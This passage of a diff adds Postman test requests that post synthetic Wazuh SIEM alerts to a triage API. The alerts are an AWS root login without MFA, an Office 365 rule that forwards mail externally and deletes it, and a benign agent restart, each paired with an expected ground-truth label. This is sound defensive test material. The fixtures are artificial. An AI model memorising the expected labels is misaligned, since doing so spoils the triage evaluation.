+              "raw": "{\n  \"id\": \"1727791217.100017\",\n  \"timestamp\": \"2026-10-01T14:36:33.000+0000\",\n  \"rule\": {\n    \"id\": \"80253\",\n    \"level\": 10,\n    \"description\": \"AWS CloudTrail: Root account console login without MFA.\",\n    \"groups\": [\n      \"amazon\",\n      \"aws\",\n      \"aws_cloudtrail\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1078.004\"\n      ],\n      \"tactic\": [\n        \"Initial Access\",\n        \"Persistence\"\n      ],\n      \"technique\": [\n        \"Cloud Accounts\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"000\",\n    \"name\": \"wazuh-manager\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"name\": \"json\"\n  },\n  \"location\": \"Wazuh-AWS\",\n  \"data\": {\n    \"integration\": \"aws\",\n    \"aws\": {\n      \"source\": \"cloudtrail\",\n      \"eventName\": \"ConsoleLogin\",\n      \"eventSource\": \"signin.amazonaws.com\",\n      \"awsRegion\": \"eu-central-1\",\n      \"sourceIPAddress\": \"102.129.152.18\",\n      \"userIdentity\": {\n        \"type\": \"Root\",\n        \"arn\": \"arn:aws:iam::123456789012:root\"\n      },\n      \"additionalEventData\": {\n        \"MFAUsed\": \"No\",\n        \"LoginTo\": \"https://console.aws.amazon.com/console/home\"\n      },\n      \"responseElements\": {\n        \"ConsoleLogin\": \"Success\"\n      },\n      \"userAgent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0\"\n    }\n  },\n  \"full_log\": \"{\\\"eventSource\\\":\\\"signin.amazonaws.com\\\",\\\"eventName\\\":\\\"ConsoleLogin\\\",\\\"awsRegion\\\":\\\"eu-central-1\\\",\\\"sourceIPAddress\\\":\\\"102.129.152.18\\\",\\\"userIdentity\\\":{\\\"type\\\":\\\"Root\\\",\\\"arn\\\":\\\"arn:aws:iam::123456789012:root\\\"},\\\"additionalEventData\\\":{\\\"MFAUsed\\\":\\\"No\\\"},\\\"responseElements\\\":{\\\"ConsoleLogin\\\":\\\"Success\\\"}}\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Expected ground truth: true positive."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202, or 502 if IRIS is unreachable for an escalated alert', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('alert stored with a valid status and triage result', () => {",
+                  "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
+                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.triage).to.have.property('is_true_positive');",
+                  "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
+                  "  });",
+                  "  const expected = pm.info.requestName.endsWith('-> TP') ? 'escalated' : 'suppressed';",
+                  "  // Informational only: the verdict depends on the triage engine (LLM vs mock),",
+                  "  // so it is logged instead of asserted. Compare with the expected ground truth.",
+                  "  console.log(`${pm.info.requestName}: got ${json.status} (${json.triage.engine}), expected ~${expected}`);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Office 365: mailbox forwarding rule to external address (lvl 9) -> TP",
+          "id": "2208000c-ec71-4726-947a-a15c02ff13f8",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"1727791218.100018\",\n  \"timestamp\": \"2026-10-01T14:37:48.000+0000\",\n  \"rule\": {\n    \"id\": \"91575\",\n    \"level\": 9,\n    \"description\": \"Office 365: New-InboxRule forwarding mail to an external address.\",\n    \"groups\": [\n      \"office365\",\n      \"ExchangeAdmin\"\n    ],\n    \"mitre\": {\n      \"id\": [\n        \"T1114.003\"\n      ],\n      \"tactic\": [\n        \"Collection\"\n      ],\n      \"technique\": [\n        \"Email Forwarding Rule\"\n      ]\n    }\n  },\n  \"agent\": {\n    \"id\": \"000\",\n    \"name\": \"wazuh-manager\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"name\": \"json\"\n  },\n  \"location\": \"office365\",\n  \"data\": {\n    \"integration\": \"office365\",\n    \"office365\": {\n      \"Operation\": \"New-InboxRule\",\n      \"Workload\": \"Exchange\",\n      \"ResultStatus\": \"True\",\n      \"UserId\": \"penzugy@lab-company.hu\",\n      \"ClientIP\": \"196.251.84.30\",\n      \"Parameters\": [\n        {\n          \"Name\": \"ForwardTo\",\n          \"Value\": \"invoices.lab-company@proton.me\"\n        },\n        {\n          \"Name\": \"Name\",\n          \"Value\": \".\"\n        },\n        {\n          \"Name\": \"MarkAsRead\",\n          \"Value\": \"True\"\n        },\n        {\n          \"Name\": \"DeleteMessage\",\n          \"Value\": \"True\"\n        }\n      ]\n    }\n  },\n  \"full_log\": \"New-InboxRule by penzugy@lab-company.hu from 196.251.84.30: Name='.' ForwardTo='invoices.lab-company@proton.me' MarkAsRead=True DeleteMessage=True\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Expected ground truth: true positive (BEC indicator)."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202, or 502 if IRIS is unreachable for an escalated alert', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('alert stored with a valid status and triage result', () => {",
+                  "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
+                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.triage).to.have.property('is_true_positive');",
+                  "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
+                  "  });",
+                  "  const expected = pm.info.requestName.endsWith('-> TP') ? 'escalated' : 'suppressed';",
+                  "  // Informational only: the verdict depends on the triage engine (LLM vs mock),",
+                  "  // so it is logged instead of asserted. Compare with the expected ground truth.",
+                  "  console.log(`${pm.info.requestName}: got ${json.status} (${json.triage.engine}), expected ~${expected}`);",
+                  "}"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Wazuh agent restarted after patching (rule 503, lvl 3) -> FP",
+          "id": "664e1bd9-a656-4a08-a10d-3f938a785aee",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              },
+              {
+                "key": "X-Webhook-Token",
+                "value": "{{webhook_token}}"
+              }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"id\": \"1727791219.100019\",\n  \"timestamp\": \"2026-10-01T14:38:02.120+0000\",\n  \"rule\": {\n    \"id\": \"503\",\n    \"level\": 3,\n    \"description\": \"Wazuh agent started.\",\n    \"groups\": [\n      \"ossec\"\n    ]\n  },\n  \"agent\": {\n    \"id\": \"003\",\n    \"name\": \"lab-web01\",\n    \"ip\": \"10.64.0.21\"\n  },\n  \"manager\": {\n    \"name\": \"wazuh-manager\"\n  },\n  \"decoder\": {\n    \"name\": \"ossec\"\n  },\n  \"location\": \"wazuh-agent\",\n  \"full_log\": \"ossec: Agent started: 'lab-web01->10.64.0.21'.\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            },
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": "Expected ground truth: false positive."
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 202, or 502 if IRIS is unreachable for an escalated alert', () => {",
+                  "  pm.expect([202, 502]).to.include(pm.response.code);",
+                  "});",
+                  "",
+                  "if (pm.response.code === 202) {",
+                  "  const json = pm.response.json();",
+                  "  pm.test('alert stored with a valid status and triage result', () => {",
+                  "    pm.expect(['escalated', 'suppressed', 'needs_review']).to.include(json.status);",
+                  "    pm.expect(json.id).to.match(/^#/);",
+                  "    pm.expect(json.triage).to.have.property('is_true_positive');",
+                  "    pm.expect(json.triage.confidence).to.be.within(0, 1);",
+                  "  });",
+                  "  const expected = pm.info.requestName.endsWith('-> TP') ? 'escalated' : 'suppressed';",
+                  "  // Informational only: the verdict depends on the triage engine (LLM vs mock),",
+                  "  // so it is logged instead of asserted. Compare with the expected ground truth.",
+                  "  console.log(`${pm.info.requestName}: got ${json.status} (${json.triage.engine}), expected ~${expected}`);",
+                  "}"
                 ]
               }
             }
